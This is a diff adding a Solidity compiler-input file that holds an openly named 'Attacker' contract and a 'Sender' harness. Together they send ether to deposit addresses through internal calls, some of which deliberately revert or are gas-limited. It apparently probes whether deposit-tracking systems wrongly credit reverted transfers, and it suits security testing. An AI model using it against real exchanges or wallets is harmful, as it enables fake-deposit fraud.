@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/attacker.sol": {
+      "content": "pragma solidity ^0.6.0;\n\ncontract Attacker {\n    uint public sentAmount;\n    \n    function attack(address payable depositAddress, bool isSuccess) public payable{\n        sentAmount = msg.value;\n        if (isSuccess) {\n            depositAddress.transfer(msg.value);\n        } else {\n            depositAddress.transfer(msg.value);\n            revert();\n        }\n    }\n}\n\ncontract Sender {\n    // address attackerContract;\n    // constructor(address attacker) public {\n    //     attackerContract = Attacker(attacker);\n    // }\n    bool public isDone;\n    uint public sentAmount;\n    uint public sendSuccessSeq = 1 + 2 + 2 ** 2 + 2 ** 5;\n    \n    function setSendSuccessSeq(uint seq) public {\n        sendSuccessSeq = seq;\n    }\n    \n    function sendByCall(address attacker, address payable[2] memory depositAddress, uint gas) public payable{\n        sentAmount = msg.value / 2;\n        for (uint i = 0; i< 2; i++) {\n            bool isSuccess = true;\n            if(sendSuccessSeq % 2 == 0) {\n                isSuccess = false;\n            }\n            sendSuccessSeq = sendSuccessSeq >> 1;\n            if(gas > 0) {\n                (isDone, ) = address(attacker).call{value: sentAmount, gas: gas}(abi.encodeWithSignature(\"attack(address,bool)\", depositAddress[i], isSuccess));\n            } else {\n                (isDone, ) = address(attacker).call{value: sentAmount}(abi.encodeWithSignature(\"attack(address,bool)\", depositAddress[i], isSuccess));\n            }\n        }\n    }\n    \n    function sendByMethod(address attacker, address payable[2] memory depositAddress, uint gas) public payable{\n        // attackerContract.attack(depositAddress);\n        sentAmount = msg.value / 2;\n        for (uint i = 0; i< 2; i++) {\n            bool isSuccess = true;\n            if(sendSuccessSeq % 2 == 0) {\n                isSuccess = false;\n            }\n            sendSuccessSeq = sendSuccessSeq >> 1;\n            if(gas > 0) {\n               Attacker(attacker).attack{value: sentAmount, gas: gas}(depositAddress[i], isSuccess); \n            } else {\n                Attacker(attacker).attack{value: sentAmount}(depositAddress[i], isSuccess); \n            }\n            \n        }\n    }\n}\n"
+    }
+  }
+}
